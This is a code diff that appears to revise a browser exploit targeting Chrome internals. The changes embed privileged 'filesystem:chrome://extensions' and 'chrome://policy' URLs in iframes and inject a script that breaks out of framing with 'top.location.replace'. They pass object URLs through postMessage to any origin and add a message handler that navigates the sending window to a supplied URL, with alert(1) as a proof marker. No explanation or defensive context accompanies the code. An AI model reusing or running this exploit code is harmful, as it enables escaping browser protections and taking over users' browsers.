@@ -136,13 +136,18 @@
 
                                 }
                                 const htmlFile = `<html>
-                                <head></head><body><iframe src="blob:chrome://policy/f6e82603-005a-40f0-a200-231bcf14eca4"></iframe>
+                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                 </html>
-                                
+                                <script>
+                                onerror=  alert;
+                                if (top !== window) {
+                                    top.location.replace(location.href);
+                                };
+                                </script>
                                 `
                                 
                                 // alert(url);
-                                opener.postMessage({ url: URL.createObjectURL(new Blob([htmlFile], {type: "text/html"})) }, '*');
+                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                 setTimeout(function () {
                                     close();
                                 }, 800);
@@ -152,9 +157,10 @@
                                 // alert(url);
                                 onmessage = function (data) {
                                     if (data.data.type === "ack") {
+                                        
                                         // chrome.tabs.getCurrent(function (tab) {
                                             // alert("navigating");
-                                            chrome.tabs.update(tab.id, { url })
+                                            top.location.replace("")
                                         // })
                                     }
                                 }
@@ -170,6 +176,12 @@
 
                 }
                 dbgext(false, pdfId, xd.toString());
+            }
+            onmessage = function (ev) {
+                if (ev.data.type === "browserInitNavigate") {
+                    alert(1);
+                    ev.source.location.replace(ev.data.url);
+                }
             }
             document.querySelector('#updater').onclick = function (ev) {
                 onunload = null;
